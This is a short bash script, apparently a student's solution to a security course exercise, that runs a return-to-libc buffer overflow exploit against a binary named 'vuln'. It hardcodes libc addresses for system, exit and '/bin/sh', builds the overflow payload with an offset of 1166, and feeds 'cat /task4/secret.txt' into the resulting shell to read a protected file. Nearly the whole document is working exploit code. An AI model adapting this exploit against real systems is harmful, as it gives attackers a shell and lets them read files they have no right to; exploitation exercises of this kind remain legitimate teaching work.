#!/usr/bin/env bash

#system at 0xf7c47cd0
#exit at 0xf7c3a1f0
#libc start at 0xf7c00000
#/bin/sh at 0xf7db90f5

#offset=1134+32=1166

systemA='\xd0\x7c\xc4\xf7'
exitA='\xf0\xa1\xc3\xf7'
libcA='\x00\x00\xc0\xf7'
binA='\xf5\x90\xdb\xf7'
	
echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh \
	/task4/s2149975/vuln "$(printf $systemA$exitA$binA)" 1166
